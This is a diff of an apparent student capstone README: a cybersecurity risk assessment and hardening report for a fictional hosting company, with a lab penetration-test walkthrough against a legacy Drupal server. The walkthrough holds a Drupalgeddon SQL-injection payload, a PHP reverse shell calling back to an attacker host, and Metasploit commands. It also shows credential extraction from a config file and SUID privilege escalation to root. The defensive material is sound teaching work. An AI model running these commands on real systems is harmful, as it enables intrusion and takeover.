@@ -1,4 +1,4 @@
-# CodeSecure Infrastructure: Network Defense & Cybersecurity Capstone
+# CodeSecure Infrastructure: Cybersecurity Risk Assessment & Infrastructure Defense Report
 
 [![Security Infrastructure](https://img.shields.io/badge/Infrastructure-Defense%20in%20Depth-blue?style=for-the-badge&logo=shield)](https://github.com)
 [![OS Basis](https://img.shields.io/badge/Linux-Debian%2013%20Hardened-red?style=for-the-badge&logo=debian)](https://github.com)
@@ -9,276 +9,300 @@
 
 ---
 
-## 📌 Executive Summary & Project Context
+## 📌 Executive Summary & Project Framing
 
-This repository contains the comprehensive technical design, implementation, pentesting report, and active defense architecture for **CodeSecure, Lda.**, a medium-sized enterprise (~40 employees) specializing in custom software development and web hosting services.
+This repository contains the master **Cybersecurity Risk Assessment, Vulnerability Audit, and Defense-in-Depth Implementation Report** delivered for **CodeSecure, Lda.**, a software development and cloud hosting provider (~40 employees). 
 
-CodeSecure operates a private datacenter hosting **120 production websites** and **14 client virtual machines**, alongside its internal enterprise network. Due to the high exposure of public-facing web services and the presence of sensitive customer data subject to strict data protection regulations (e.g., GDPR), this project establishes an end-to-end **Defense in Depth** architecture, replacing obsolete legacy systems with a multi-layered, resilient security infrastructure.
+CodeSecure operates an internal enterprise network alongside a private datacenter hosting **120 production client websites** and **14 dedicated virtual machines**. Facing elevated exposure from public web services and stringent compliance mandates (e.g., GDPR), this assessment documents the complete transition from an unpatched, flat network infrastructure to a hardened, segmented, and continuously monitored **Defense-in-Depth** security baseline.
 
-![CodeSecure Capstone Project Cover](images/cover_project.png)
+![CodeSecure Assessment Report Cover](images/cover_project.png)
 
-### 🏢 Enterprise Environment & Attack Surface Overview
-* **Human Resources & Workforce:** ~40 employees divided across four primary departments.
-* **Hosting Surface:** 120 external websites and 14 dedicated client VMs hosted in the private datacenter.
-* **Internal Departments:**
-  1. **Human Resources (HR):** Personnel management, contracts, sensitive employee data.
-  2. **Software Development:** Proprietary codebases, repository servers, staging environments.
-  3. **Technical Support / Helpdesk:** Client support systems and remote assistance tools.
-  4. **Infrastructure & Datacenter Operations:** Production servers, networking hardware, SIEM, and monitoring nodes.
-* **Core Requirement:** Complete network segmentation separating internal departmental operations, datacenter infrastructure, and external multi-tenant client environments.
+### 🏢 Enterprise Scope & Operations Profile
+* **Workforce Profile:** ~40 employees structured into four core functional departments:
+  1. **Human Resources (HR):** Personnel management, contracts, payroll, confidential employee records.
+  2. **Software Development:** Proprietary codebases, staging/testing environments, repository servers.
+  3. **Technical Support / Helpdesk:** Customer assistance systems, infrastructure maintenance, remote management.
+  4. **Infrastructure & Datacenter Operations:** Production web servers, core switches, SIEM, and monitoring nodes.
+* **Hosting Surface:** 120 external client websites and 14 dedicated client VMs hosted in the private datacenter.
+* **Core Requirement:** Complete network segmentation isolating internal operational traffic, multi-tenant client environments, and public web infrastructure.
 
+![Scenario Framing - CodeSecure Lda](images/scenario_framing.png)
 
 ---
 
 ## 📑 Table of Contents
-1. [Asset Risk Assessment & Threat Modeling](#-asset-risk-assessment--threat-modeling)
-2. [Network Architecture & Perimeter Security](#-network-architecture--perimeter-security)
-3. [Penetration Testing Walkthrough: Target DC-1](#-penetration-testing-walkthrough-target-dc-1)
-4. [Linux Systems Hardening (Debian 13)](#-linux-systems-hardening-debian-13)
-5. [Windows Server & Active Directory Identity Management](#-windows-server--active-directory-identity-management)
-6. [SIEM, Centralized Logging & Active Response](#-siem-centralized-logging--active-response)
-7. [Conclusion & Future Security Roadmap](#-conclusion--future-security-roadmap)
+1. [Full Quantitative Risk Assessment & Threat Matrix (19 Assets)](#1-full-quantitative-risk-assessment--threat-matrix-19-assets)
+2. [Network Architecture & Perimeter Defense](#2-network-architecture--perimeter-defense)
+3. [Penetration Testing Walkthrough: Target DC-1](#3-penetration-testing-walkthrough-target-dc-1)
+4. [Linux Systems Security & Hardening (Debian 13 Baseline)](#4-linux-systems-security--hardening-debian-13-baseline)
+5. [Windows Server & Active Directory Identity Hardening](#5-windows-server--active-directory-identity-hardening)
+6. [SIEM, Centralized Logging & Active Response Architecture](#6-siem-centralized-logging--active-response-architecture)
+7. [Implementation Recommendations Roadmap (Short, Mid, Long-Term)](#7-implementation-recommendations-roadmap-short-mid-long-term)
+8. [Lessons Learned & Key Architectural Takeaways](#8-lessons-learned--key-architectural-takeaways)
 
 ---
 
-## 📊 Asset Risk Assessment & Threat Modeling
+## 1. Full Quantitative Risk Assessment & Threat Matrix (19 Assets)
 
-A thorough risk assessment was conducted across 19 critical assets in the CodeSecure environment. Risk scores were evaluated using the standard matrix formula:
+A quantitative risk assessment was conducted across all 19 critical infrastructure assets at CodeSecure. Risk scores were calculated using the standard risk matrix formula:
 $$\text{Risk Score} = \text{Likelihood (1--5)} \times \text{Impact (1--5)}$$
 
-![Asset Risk Assessment](images/risk_assessment_chart.png)
+* **High/Critical Risk (Score $\ge 20$):** Immediate action required; priority defensive controls applied.
+* **Medium Risk ($10 \le \text{Score} \le 15$):** Scheduled remediation within operational maintenance windows.
+* **Low Risk (Score $\le 8$):** Accepted risk with continuous audit monitoring.
 
-### 🎯 Critical Asset Risk Matrix (Score $\ge 20$: Immediate Action)
+![Asset Risk Assessment Distribution](images/risk_assessment_chart.png)
 
-| Asset Name | Threat Vector | Likelihood | Impact | Risk Score | Mitigation Strategy |
-| :--- | :--- | :---: | :---: | :---: | :--- |
-| **Access Credentials** | Identity theft, credential harvesting, total administrative compromise | 5 | 5 | **25 (Critical)** | Password rotation GPOs, SSH keys only, PAM, MFA enforcement |
-| **Production Servers & Websites** | Ransomware, zero-day exploits, SQL Injection, DDoS | 4 | 5 | **20 (High)** | Automated patching, EDR/Wazuh, WAF (ModSecurity), offsite backups |
-| **Public Exposed Server (DC-1)** | Unauthenticated RCE, web vulnerability exploitation | 5 | 4 | **20 (High)** | Nginx Reverse Proxy, WAF, OS deprecation & migration to Debian 13 |
-| **Hosted Websites** | XSS, SQLi, LFI, RCE via CMS vulnerabilities | 5 | 4 | **20 (High)** | OWASP CRS integration, pentesting, automated vulnerability scanning |
-| **External Client Data** | Unauthorized access, data exfiltration, GDPR violation fines | 4 | 5 | **20 (High)** | At-rest & in-transit encryption, strict RBAC, data isolation |
-| **Internal Enterprise Network** | Lateral movement, packet sniffing, ARP spoofing | 4 | 5 | **20 (High)** | VLAN segmentation, DAI, DHCP Snooping, 802.1X Port Security |
+### 📋 Complete 19-Asset Risk Assessment Table
 
----
-
-## 🌐 Network Architecture & Perimeter Security
-
-The network architecture was engineered following the **Defense in Depth** paradigm. The perimetric design guarantees that an incident in one segment remains strictly contained, preventing lateral movement to internal core databases or domain management nodes.
-
-![Network Topology and Defense in Depth](images/network_topology.png)
-
-### 🛡️ Core Network Hardening Controls
-
-1. **VLAN Segmentation & Inter-VLAN ACLs:**
-   * **DMZ (VLAN 80 Frontend / VLAN 70 Backend):** Public web services and Reverse Proxy nodes.
-   * **Development (VLAN 10):** Isolated developer workstations and code staging environments.
-   * **Human Resources (VLAN 20):** High-confidentiality segment with strict access control lists.
-   * **Helpdesk (VLAN 30):** Technical support workstations separated from production datacenter.
-   * **Datacenter & Management (VLAN 99):** Core switching, Domain Controllers, Wazuh SIEM, Rsyslog.
-
-2. **Perimeter Firewall & NAT Configuration (pfSense):**
-   * Configured with a default-deny posture on all interfaces.
-   * **Port Forwarding (DNAT):** Inbound WAN HTTP (80) and HTTPS (443) traffic is strictly forwarded to the Nginx Reverse Proxy in the DMZ. Direct exposure of internal application servers is eliminated.
-
-3. **Layer 2 & Layer 3 Switch Hardening:**
-   * **Port Security:** Sticky MAC address limits configured per port on edge switches (`switchport port-security`).
-   * **Unused Port Shutdown:** All unassigned switch ports are explicitly disabled (`shutdown`) and assigned to a dummy VLAN.
-   * **DHCP Snooping & Dynamic ARP Inspection (DAI):** Prevents rogue DHCP server insertion and ARP poisoning/spoofing attacks by validating packets against the DHCP binding table.
-   * **High Availability (HSRP):** Core switches run Hot Standby Router Protocol (HSRP) for continuous default gateway redundancy.
-   * **Centralized AAA:** Router and switch administrative access managed via centralized RADIUS/TACACS+ server with mandatory SSHv2 encryption.
-
-![Reverse Proxy Architecture](images/reverse_proxy_arch.png)
+| Asset # | Asset Name | Risk Description | Threat Vector | Likelihood | Impact | Risk Score | Mitigation Strategy |
+| :---: | :--- | :--- | :---: | :---: | :---: | :---: | :--- |
+| **1** | **Access Credentials** | Theft, credential harvesting, administrative compromise | Internal & External | 5 | 5 | **25 (High/Critical)** | Mandatory password rotation GPOs, SSH key-only auth, PAM, MFA enforcement |
+| **2** | **Production Servers** | Ransomware, zero-day exploits, DoS attacks | Internal & External | 4 | 5 | **20 (High)** | Automated patching, Wazuh EDR, strict UFW firewalls, offsite backups |
+| **3** | **Public Exposed Server (DC-1)** | Unauthenticated RCE, web exploit, code injection | External | 5 | 4 | **20 (High)** | Nginx Reverse Proxy, ModSecurity WAF, OS replacement (Debian 13) |
+| **4** | **Hosted Websites (120 Sites)** | XSS, SQLi, LFI, RCE via CMS vulnerabilities | External | 5 | 4 | **20 (High)** | ModSecurity WAF with OWASP CRS, pentesting, automated CMS update scripts |
+| **5** | **External Client Data (GDPR)** | Unauthorized access, data exfiltration, regulatory fines | Internal & External | 4 | 5 | **20 (High)** | Data encryption at rest & in transit, granular RBAC, GDPR compliance controls |
+| **6** | **Internal Network** | Lateral movement, packet sniffing, ARP spoofing | Internal | 4 | 5 | **20 (High)** | VLAN segmentation, Layer 3 ACLs, Dynamic ARP Inspection (DAI), DHCP Snooping |
+| **7** | **Web Hosting Servers** | Web service exploitation, CMS zero-days | External | 5 | 4 | **20 (High)** | Minimal OS footprint, WAF filtering, automated security patching, VLAN isolation |
+| **8** | **Datacenter Facility** | Unauthorized physical access, physical tampering | Internal & External | 3 | 5 | **15 (Medium)** | Biometric access control, 24/7 video surveillance, environmental monitoring |
+| **9** | **Production Databases** | SQL Injection exfiltration, ransomware, unauthorized access | Internal & External | 3 | 5 | **15 (Medium)** | Strict RBAC, database field encryption, query auditing, isolated DMZ VLAN |
+| **10** | **External Client VM Data** | Client data modification or exfiltration | Internal & External | 3 | 4 | **12 (Medium)** | Storage volume encryption, hypervisor access logging, automated VM snapshots |
+| **11** | **Client Virtual Machines (14 VMs)** | Vulnerability exploitation pivoting to adjacent hypervisors | External | 3 | 4 | **12 (Medium)** | Dedicated client VLANs, inter-VM firewall rules, Wazuh IDS/IPS agent monitoring |
+| **12** | **Core Infrastructure** | Switch/firewall firmware exploits, unauthorized config changes | Internal & External | 3 | 4 | **12 (Medium)** | Centralized AAA (RADIUS/TACACS+), SNMPv3 with AES, Port Security |
+| **13** | **Employee Workstations** | Malware infection, email phishing, credential harvesting | Internal & External | 4 | 3 | **12 (Medium)** | Defender Endpoint Protection, %APPDATA% block policy, phishing training |
+| **14** | **Server & Workstation OS** | Unpatched OS vulnerabilities, insecure default settings | External | 3 | 4 | **12 (Medium)** | Minimal OS baseline (Debian 13), automated update schedule, auditd logging |
+| **15** | **System Configurations** | Unauthorized configuration drift, malicious tweaks | Internal | 3 | 4 | **12 (Medium)** | Centralized GPO/Ansible management, File Integrity Monitoring (FIM) |
+| **16** | **Internal Source Code** | Source code theft, reverse engineering, backdoor insertion | Internal | 2 | 4 | **8 (Low)** | Isolated Development VLAN 10, mandatory peer code reviews, SSH key access |
+| **17** | **Internal Business Records** | Data exfiltration via malware or unauthorized internal sharing | Internal | 2 | 4 | **8 (Low)** | Information classification, department Homefolders with strict ACLs, encrypted backups |
+| **18** | **Human Resources Records** | Spear-phishing, unauthorized access to payroll records | Internal | 2 | 4 | **8 (Low)** | Dedicated HR VLAN 20, strict AD permissions, data encryption at rest |
+| **19** | **System Audit Logs** | Log tampering or deletion by attackers covering tracks | Internal | 2 | 4 | **8 (Low)** | Centralized Rsyslog server, Wazuh SIEM forwarding, append-only audit files |
 
 ---
 
-## ⚔️ Penetration Testing Walkthrough: Target DC-1
+## 2. Network Architecture & Perimeter Defense
 
-To demonstrate the critical risk posed by legacy infrastructure, a controlled penetration test was executed against the existing legacy server **DC-1** (`192.168.1.26`).
+The redesigned network architecture adheres strictly to **Defense-in-Depth**. Perimetric enforcement ensures that any breach in an external-facing node remains strictly isolated, preventing lateral movement toward core databases or domain controllers.
 
-![DC-1 Vulnerability Reconnaissance](images/dc1_vulnerability_recon.png)
+![Network Architecture and Defense in Depth](images/network_topology.png)
 
-### 🔍 Reconnaissance & Vulnerability Discovery
-1. **Network Scanning (Nmap):**
+### 🛡️ Layered Network Hardening Summary
+
+1. **VLAN Segmentation Scheme:**
+   * **DMZ (VLAN 80 Frontend / VLAN 70 Backend):** Public web services and Nginx Reverse Proxy.
+   * **Development (VLAN 10):** Isolated developer workstations, staging servers, repository nodes.
+   * **Human Resources (VLAN 20):** High-confidentiality segment enforcing strict departmental ACLs.
+   * **Helpdesk (VLAN 30):** Support workstations separated from production infrastructure.
+   * **Datacenter & Management (VLAN 99):** Core Domain Controllers, Wazuh SIEM, Rsyslog server, switches.
+
+2. **Perimeter Firewall & NAT Controls (pfSense):**
+   * Default-deny policy on all WAN/LAN interfaces.
+   * **Destination NAT (DNAT):** Inbound HTTP (80) and HTTPS (443) traffic is forwarded exclusively to the Nginx Reverse Proxy in the DMZ. Direct public exposure of internal application servers is eliminated.
+
+3. **Switch Port & Layer 2 Security:**
+   * **Switchport Port Security:** Enforces sticky MAC address limits per access port (`switchport port-security maximum 1`).
+   * **Unused Port Shutdown:** All unassigned switch ports are explicitly disabled (`shutdown`) and placed in a dead-end VLAN.
+   * **DHCP Snooping & Dynamic ARP Inspection (DAI):** Mitigates rogue DHCP insertion and ARP poisoning by validating ARP packets against the DHCP binding database.
+   * **Default Gateway Redundancy:** High Availability HSRP configured across core distribution switches.
+   * **Centralized AAA:** Administrative switch access controlled via FreeRADIUS with mandatory SSHv2 encryption.
+
+![Reverse Proxy Architecture Solution](images/reverse_proxy_arch.png)
+
+---
+
+## 3. Penetration Testing Walkthrough: Target DC-1
+
+To demonstrate the critical risk posed by legacy infrastructure, a controlled penetration test was executed against target host **DC-1** (`192.168.1.26`).
+
+![Vulnerability Analysis DC-1 Reconnaissance](images/dc1_vulnerability_recon.png)
+
+### 🔍 Attack Execution & Escalation Sequence
+
+1. **Reconnaissance & Service Scanning:**
    ```bash
-   nmap -sV -sC -A -p- 192.168.1.26
+   nmap -sn 192.168.1.0/24
+   nmap -sS -sV -sC -O -p- 192.168.1.26
    ```
-   * *Open Ports Discovered:* Port 80/tcp (HTTP - Apache 2.2.22), Port 22/tcp (OpenSSH 6.0p1).
-2. **Web Vulnerability Scanning (Nikto & CMSRecon):**
-   * Identified Drupal 7.x installation suffering from unpatched SQL Injection (`CVE-2014-3704`, widely known as **Drupalgeddon 1**).
+   * *Discovered Services:* `22/tcp` (OpenSSH 6.0p1 Debian), `80/tcp` (Apache 2.2.22, Drupal 7), `111/tcp` (RPCbind).
+   * *OS Identification:* Outdated Linux Kernel 3.2 (Debian 7 Wheezy).
 
-### 💥 Exploitation Chain: SQLi to Remote Code Execution & Privilege Escalation
-
-![DC-1 Exploit Chain](images/dc1_exploit_chain.png)
-
-1. **Initial Access via Drupalgeddon (CVE-2014-3704):**
-   * Crafted a malformed POST request to the Drupal login form abusing the expansion of the `form_build_id` array in the database abstraction layer.
-   * Injected an administrative user (`pwned_admin`) into the Drupal database:
-   ```http
-   POST /?q=node&destination=node HTTP/1.1
-   Host: 192.168.1.26
-   Content-Type: application/x-www-form-urlencoded
-
-   name[0%20%3D%20%27admin%27%20--%20]=pwned&name[0]=1&pass=admin123&form_id=user_login
+2. **Web Vulnerability Identification:**
+   ```bash
+   nmap --script http-enum,http-vuln* -p 80 192.168.1.26
+   searchsploit drupal 7.0
    ```
-2. **Reverse Shell Execution:**
-   * Logged in as `pwned_admin`, enabled the PHP Filter module, and saved a custom PHP web shell payload to trigger an outbound TCP socket to the attacker machine (`192.168.1.50:4444`).
-   ```php
-   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'"); ?>
+   * *Vulnerability Confirmed:* **CVE-2014-3704 (Drupalgeddon SQL Injection)**.
+
+3. **Initial Access & SQL Injection Exploitation:**
+   ```bash
+   python2 34992.py -t http://192.168.1.26 -u cesae -p cesae123
    ```
-3. **Privilege Escalation to Root:**
-   * Enumerated SUID binaries using `find`:
+   * *Result:* Injected an administrative user (`cesae:cesae123`) directly into the Drupal MySQL database.
+
+4. **Metasploit Shell Establishment:**
+   ```bash
+   msfconsole -q
+   use exploit/unix/webapp/drupal_drupalgeddon2
+   set RHOSTS 192.168.1.26
+   exploit
+   ```
+   * *Result:* Established a Meterpreter shell under account `www-data` (`uid=33`).
+
+5. **Post-Exploitation & Credential Harvesting:**
+   ```bash
+   cat /var/www/sites/default/settings.php
+   ```
+   * *Result:* Extracted plain-text database credentials (`drupaldb` / `dbuser:dbpass`). Dumped user password hashes from `users` table and extracted system users from `/etc/passwd`.
+
+6. **Privilege Escalation to Root:**
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    ```
-   * Discovered `/usr/bin/find` configured with the SUID bit set. Executed arbitrary commands as root:
-   ```bash
-   find . -exec /bin/sh -p \;
-   # whoami
-   # root
-   ```
+   * *Discovered Binary:* `/usr/bin/find` configured with an improper SUID bit owned by `root`.
+   * *Exploitation (GTFOBins):*
+     ```bash
+     find . -exec /bin/sh \; -quit
+     ```
+   * *Outcome:* Complete system compromise (`uid=0(root)`).
 
-### 🎯 MITRE ATT&CK Mapping Table
+![The Breach SQL Injection to Root](images/dc1_exploit_chain.png)
 
-| Phase | Technique ID | Technique Name | Exploited Vulnerability / Action |
-| :--- | :--- | :--- | :--- |
-| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Nmap & Nikto HTTP banner grabbing |
-| **Initial Access** | `T1190` | Exploit Public-Facing Application | Drupal 7 `CVE-2014-3704` SQL Injection |
-| **Execution** | `T1059.004` | Command and Scripting Interpreter: Unix Shell | PHP Reverse Shell execution |
-| **Persistence** | `T1098` | Account Manipulation | Insertion of backdoor admin user in Drupal DB |
-| **Privilege Escalation** | `T1548.001` | Abuse Elevation Control: Setuid and Setgid | Abuse of `/usr/bin/find` SUID binary |
+### 🎯 MITRE ATT&CK TTP Mapping Table
 
----
-
-## 🐧 Linux Systems Hardening (Debian 13)
-
-To replace vulnerable legacy OS instances, all Linux web and application servers were rebuilt on **Debian 13 (Trixie)** adhering to CIS Benchmarks.
-
-![Linux Hardening Stack](images/linux_hardening_stack.png)
-
-### ⚙️ System Baseline & Service Security Configuration
-
-1. **SSH Hardening (`/etc/ssh/sshd_config`):**
-   * Relocated SSH port from 22 to non-standard port `2222`.
-   * Explicitly disabled root login and password-based authentication.
-   * Mandatory RSA 4096-bit or Ed25519 key pair authentication.
-   ```ini
-   Port 2222
-   PermitRootLogin no
-   PasswordAuthentication no
-   PubkeyAuthentication yes
-   MaxAuthTries 3
-   ClientAliveInterval 300
-   ClientAliveCountMax 2
-   AllowUsers sysadmin devops
-   ```
-
-2. **Uncomplicated Firewall (UFW) Implementation:**
-   ```bash
-   ufw default deny incoming
-   ufw default allow outgoing
-   ufw allow 2222/tcp comment 'Hardened SSH'
-   ufw allow 80/tcp comment 'HTTP Web Services'
-   ufw allow 443/tcp comment 'HTTPS Encrypted'
-   ufw enable
-   ```
-
-3. **Web Application Firewall (Nginx + ModSecurity + OWASP CRS):**
-   * Deployed Nginx as a Reverse Proxy with `modsecurity_module` enabled.
-   * Integrated OWASP Core Rule Set (CRS v3.3) to inspect inbound HTTP headers, cookies, and POST bodies in real-time, blocking SQLi, XSS, and LFI attacks before hitting application servers.
+| Phase | MITRE ATT&CK Tactic | Technique ID | Technique Description | Attack Artifact |
+| :--- | :--- | :--- | :--- | :--- |
+| **Reconnaissance** | Reconnaissance | `T1595.002` | Vulnerability Scanning | Nmap port scan & `http-vuln` scripts |
+| **Initial Access** | Initial Access | `T1190` | Exploit Public-Facing Application | SQL Injection via CVE-2014-3704 |
+| **Persistence** | Persistence | `T1136.001` | Create Account: Local Account | Injected admin user `cesae` into database |
+| **Execution** | Execution | `T1059.006` | Python / PHP Command Execution | Metasploit PHP payload execution |
+| **Credential Access** | Credential Access | `T1552.001` | Credentials In Files | Plain-text DB credentials in `settings.php` |
+| **Privilege Escalation**| Privilege Escalation | `T1548.001` | Setuid and Setgid Abuse | Abused `/usr/bin/find` SUID bit for root shell |
 
 ---
 
-## 🪟 Windows Server & Active Directory Identity Management
+## 4. Linux Systems Security & Hardening (Debian 13 Baseline)
 
-Corporate user accounts, workstations, and server permissions are centrally governed via **Windows Server Active Directory Domain Services (AD DS)**.
+To replace vulnerable legacy OS instances, all Linux virtual machines were redeployed using a minimal **Debian 13 (Trixie)** baseline installation.
 
-![Windows AD GPO Identity Management](images/windows_ad_gpo.png)
+![Linux Systems Security Debian 13](images/linux_hardening_stack.png)
 
-### 🏢 Organizational Unit (OU) Architecture & Group Policy Objects
+### 🛠️ Key Linux Hardening Implementations
 
-```text
-CodeSecure.local
-├── 📁 Production_Servers (Datacenter Member Servers)
-├── 📁 Domain_Controllers
-└── 📁 CodeSecure_Users
-    ├── 📁 Administration (HR, Finance, Management)
-    ├── 📁 Software_Development (Developers, DevOps)
-    ├── 📁 Technical_Support (Helpdesk, Field Support)
-    └── 📁 Infrastructure_Ops (Sysadmins, SOC Analysts)
+1. **Minimal Install & Automatic Updates:**
+   * Package selection restricted strictly to `standard system utilities` to minimize attack surface.
+   * `unattended-upgrades` configured with a 12-hour delayed window to verify patch stability prior to deployment.
+
+2. **SSH Service Hardening (`/etc/ssh/sshd_config`):**
+   * Default port changed to `2222`.
+   * `PermitRootLogin no`
+   * `PasswordAuthentication no` (SSH key-based authentication only).
+   * Group-restricted login allowed only for authorized system administrators.
+
+3. **Host Firewall & Brute-Force Protection:**
+   * **UFW Policy:** Default deny incoming, default allow outgoing. Open ports restricted to specific role needs (e.g., `2222/tcp`, `80/tcp`, `443/tcp`).
+   * **Fail2ban:** Configured to monitor SSH logs and block IP addresses failing 6 consecutive login attempts for 1 hour.
+
+4. **Auditing & Mandatory Access Control:**
+   * **auditd:** Enforces immutable logging for changes to critical files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`) and logs all `sudo` invocations.
+   * **AppArmor:** Mandatory Access Control (MAC) profiles active in `enforce` mode across all network-facing applications.
+
+5. **Web Application Security (ModSecurity WAF):**
+   * Nginx Reverse Proxy integrated with ModSecurity v3 and OWASP Core Rule Set (CRS).
+   * Filters HTTP traffic against SQLi, XSS, LFI, and RCE attempt vectors before traffic reaches backend application nodes.
+
+---
+
+## 5. Windows Server & Active Directory Identity Hardening
+
+Central identity, authentication, and authorization for the internal network are managed via a hardened **Windows Server Domain Controller**.
+
+![Windows Server Active Directory Identity Management](images/windows_ad_gpo.png)
+
+### ⚙️ Group Policy Objects (GPO) Configuration Baseline
+
+* **Organizational Unit (OU) Hierarchy:** Dedicated OUs created for `Development`, `HelpDesk`, and `Human Resources`, enabling granular privilege assignment.
+* **Password Policy GPO:**
+  * Minimum length: **12 characters**.
+  * Complexity required: Upper, lower, numeric, and special characters.
+  * Maximum age: 60 days; Minimum age: 1 day.
+  * History restriction: Remembers last 15 passwords. Reversible encryption disabled.
+* **Account Lockout GPO:** Accounts lock for **15 minutes** after 3 consecutive failed login attempts.
+* **User Account Control (UAC):** Forced *Admin Approval Mode* (`Run all administrators in Admin Approval Mode`).
+* **Software Restriction Policies (SRP):**
+  * Default security level set to `Disallowed`.
+  * Executable execution explicitly blocked in `%APPDATA%`, `%LOCALAPPDATA%`, and `%TEMP%`.
+  * Execution allowed strictly within `C:\Windows` and `C:\Program Files`.
+* **Windows Defender & Real-Time Protection:** Enforcement GPO prevents employees from disabling real-time monitoring or cloud antivirus protection.
+* **Departmental Homefolders:** Automated drive mapping with NTFS permissions restricting access exclusively to the individual user and Domain Admins.
+
+---
+
+## 6. SIEM, Centralized Logging & Active Response Architecture
+
+Security logging across pfSense, Linux nodes, Windows Server, and Nginx is consolidated into a centralized **SIEM and Log Aggregation Pipeline**.
+
+![Monitoring and Log Architecture Rsyslog Wazuh](images/siem_logging_pipeline.png)
+
+### 🔄 Centralized Log Pipeline Architecture
+
+1. **Rsyslog Server Aggregation:** Dedicated log server listening on UDP/TCP port `514`. Logs are structured dynamically into directories by originating hostname and application name.
+2. **Wazuh SIEM Integration:** Wazuh Manager evaluates host events in real-time. Security alerts with severity $\ge 3$ are forwarded to the Rsyslog server for persistent long-term storage.
+
+![SIEM Wazuh Active Response Dashboard](images/wazuh_active_response.png)
+
+### ⚡ Wazuh Active Response Automation Rules
+
+* **Linux Automated IP Block:** Drops source IPs for 10 minutes upon detecting brute-force attempts or SQL Injection patterns.
+* **Blacklist Enforcement:** Immediately drops traffic from known malicious threat actor IPs for 60 seconds upon first packet detection.
+* **YARA Malware Scan Integration:** Triggers automated YARA scans upon file creation or modification in monitored paths (`/var/www`, `/home`). Detected malware is automatically isolated into a secure quarantine folder.
+* **File Integrity Monitoring (FIM):** Tracks real-time additions, modifications, or deletions across critical system files (`/etc/passwd`, `/etc/shadow`, system binaries).
+
+---
+
+## 7. Implementation Recommendations Roadmap (Short, Mid, Long-Term)
+
+To provide CodeSecure's executive board with a practical execution path, security controls are prioritized across three implementation windows based on risk urgency and operational effort:
+
+```
++-----------------------------------------------------------------------------------+
+|                        CODESECURE IMPLEMENTATION ROADMAP                          |
++-----------------------------------------------------------------------------------+
+| 🚨 SHORT-TERM (0 - 30 Days)  | Immediate Remediation & Perimetric Control         |
+| 🛡️ MID-TERM (30 - 90 Days)   | Network Isolation, Active EDR & Directory Hardening|
+| 🎯 LONG-TERM (90 - 180+ Days) | Governance, MFA Enforcement & Compliance Maturity  |
++-----------------------------------------------------------------------------------+
 ```
 
-### 🔒 Enforced Group Policies (GPOs)
+### 🚨 Short-Term Implementations (Immediate / 0–30 Days)
+* **Retire Legacy Systems (DC-1):** Decommission unpatched Debian 7 / Drupal 7 legacy instances immediately; migrate hosted web services to hardened Debian 13 containers behind Nginx.
+* **Deploy Perimeter Reverse Proxy & WAF:** Route all inbound port 80/443 traffic through Nginx with ModSecurity v3 and OWASP Core Rule Set (CRS) enabled in blocking mode.
+* **Enforce Password & Lockout GPOs:** Apply Active Directory GPOs enforcing 12-character complex passwords and 3-attempt account lockout rules across all corporate user accounts.
+* **Hardened SSH Access:** Shift all Linux administrative SSH access to port `2222`, disable password authentication, enforce key-only logins, and block direct root SSH sessions.
+* **Perimeter Firewall Default-Deny:** Enforce default-deny inbound and outbound rules on pfSense with strict WAN DNAT port forwarding.
 
-1. **Password Complexity & Account Lockout Policy:**
-   * Minimum password length: **14 characters**.
-   * Password history enforcement: **24 remembered passwords**.
-   * Maximum password age: **90 days**.
-   * Account Lockout Threshold: **5 failed logon attempts** within 15 minutes triggers a **30-minute lockout**.
+### 🛡️ Mid-Term Implementations (30–90 Days)
+* **Full Network VLAN Segmentation:** Enforce VLAN isolation across DMZ (80/70), Dev (10), HR (20), Helpdesk (30), and Datacenter (99) with inter-VLAN layer 3 ACLs.
+* **Switch Layer 2 Port Security:** Configure `switchport port-security`, DHCP Snooping, and Dynamic ARP Inspection (DAI) across all edge distribution switches.
+* **Deploy Centralized Wazuh SIEM & EDR:** Install Wazuh Agents across all Linux servers, Windows DCs, and employee endpoints; configure automated active response for IP blocking.
+* **Active Directory Software Restriction Policies (SRP):** Enforce GPOs blocking binary and script executions within `%APPDATA%` and `%TEMP%` user directories.
+* **YARA Malware Automation:** Integrate automated YARA scanning triggers with Wazuh for real-time web root (`/var/www`) file inspection and quarantine.
 
-2. **User Rights Assignment & LAPS:**
-   * Local Administrator Password Solution (LAPS) deployed to auto-rotate unique local administrator passwords across all domain workstations daily.
-   * Prevented non-administrative domain users from logging on locally to Domain Controllers or server consoles.
-
-3. **Advanced Security Audit Policy:**
-   * Enabled detailed auditing for Account Logon, Object Access, Privilege Use, and Process Creation (Event ID `4688` with Command Line Logging enabled).
-
----
-
-## 🛡️ SIEM, Centralized Logging & Active Response
-
-To ensure continuous visibility across all endpoints, network switches, firewalls, and servers, a centralized **Wazuh SIEM & EDR** cluster was deployed alongside **Rsyslog over TLS**.
-
-![SIEM Logging Pipeline](images/siem_logging_pipeline.png)
-
-### 🔄 Centralized Log Aggregation Architecture
-1. **Rsyslog Collector:** Centralizes syslogs from pfSense firewalls, managed switches, and Linux web servers over encrypted TLS transport (`port 6514`).
-2. **Wazuh Agents:** Installed across Linux application servers and Windows Server AD, streaming file integrity monitoring (FIM) and system audit events to the Wazuh Manager.
-3. **YARA Engine Integration:** Embedded with Wazuh agents to automatically scan created or modified files in `/var/www/` and `/tmp/` against custom malware signatures.
-
-![Wazuh Active Response](images/wazuh_active_response.png)
-
-### ⚡ Automated Active Response Trigger Rules
-When brute-force authentication, web scanning, or privilege escalation attempts are detected, Wazuh triggers automated active response scripts:
-
-```xml
-<!-- Custom Wazuh Rule: Detect Web Shell Creation & Block Source IP -->
-<group name="syscheck,yara,active_response">
-  <rule id="100201" level="12">
-    <if_sid>550</if_sid>
-    <match>YARA Rule Match: PHP_Webshell_Pattern</match>
-    <description>Critical: Webshell drop detected in web root by YARA scanner!</description>
-    <mitre>
-      <id>T1505.003</id>
-    </mitre>
-  </rule>
-
-  <rule id="100202" level="10">
-    <if_matched_sid>31100</if_matched_sid>
-    <same_source_ip />
-    <frequency>5</frequency>
-    <timeframe>60</timeframe>
-    <description>Multiple Web Attack attempts detected from same IP within 60s.</description>
-    <mitre>
-      <id>T1190</id>
-    </mitre>
-  </rule>
-</group>
-```
-
-* **Active Response Action:** Triggers firewall block script (`firewall-drop`) to append the offending source IP address to the UFW/pfSense blocklist for 24 hours automatically.
